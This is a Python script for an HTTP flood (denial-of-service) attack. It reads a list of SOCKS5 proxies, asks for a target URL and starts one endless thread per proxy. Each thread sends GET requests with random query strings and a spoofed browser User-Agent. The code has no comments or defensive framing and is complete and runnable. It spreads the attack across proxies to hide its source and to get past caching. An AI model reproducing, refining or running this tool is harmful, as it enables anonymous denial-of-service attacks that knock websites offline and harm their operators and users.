import socket
import socks
import ssl
import threading
import time
import random
import string

def get_proxy_list(file_path):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    parts = line.split(":")
                    proxies.append((parts[0], int(parts[1])))
    except Exception as e:
        print(e)
    return proxies

def create_random_id(length=8):
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def get_url_details(url):
    if url.startswith("https://"):
        use_ssl = True
        url_no_proto = url[8:]
    elif url.startswith("http://"):
        use_ssl = False
        url_no_proto = url[7:]
    else:
        raise ValueError("URL must start with http:// or https://")

    if "/" in url_no_proto:
        host_part, path = url_no_proto.split("/", 1)
        path = "/" + path
    else:
        host_part = url_no_proto
        path = "/"

    if ":" in host_part:
        host, port = host_part.split(":")
        port = int(port)
    else:
        host = host_part
        port = 443 if use_ssl else 80

    return host, port, path, use_ssl

def start_connection_loop(p_host, p_port, t_host, t_port, base_path, use_ssl):
    ssl_context = ssl.create_default_context() if use_ssl else None
    
    while True:
        s = None
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, p_host, p_port)
            s.settimeout(5)
            
            s.connect((t_host, t_port))
            
            client = s
            if use_ssl:
                client = ssl_context.wrap_socket(s, server_hostname=t_host)
            
            random_path = f"{base_path}{'&' if '?' in base_path else '?'}q={create_random_id()}"
            request = (
                f"GET {random_path} HTTP/1.1\r\n"
                f"Host: {t_host}\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0\r\n"
                "Connection: close\r\n\r\n"
            ).encode('utf-8')
            
            client.sendall(request)
            
        except Exception as e:
            print(e)
        finally:
            if s:
                s.close()

def run_app():
    try:
        user_input = input("Please enter full URL: ").strip()
        t_host, t_port, base_path, use_ssl = get_url_details(user_input)
    except Exception as e:
        print(f"{e}")
        return

    proxy_list = get_proxy_list("socks5.txt")
    if not proxy_list:
        print("Proxy list is empty.")
        return

    print(f"Target: {t_host}:{t_port}{base_path}")
    print(f"Starting threads for {len(proxy_list)} proxies...")

    for p_host, p_port in proxy_list:
        t = threading.Thread(
            target=start_connection_loop, 
            args=(p_host, p_port, t_host, t_port, base_path, use_ssl)
        )
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    run_app()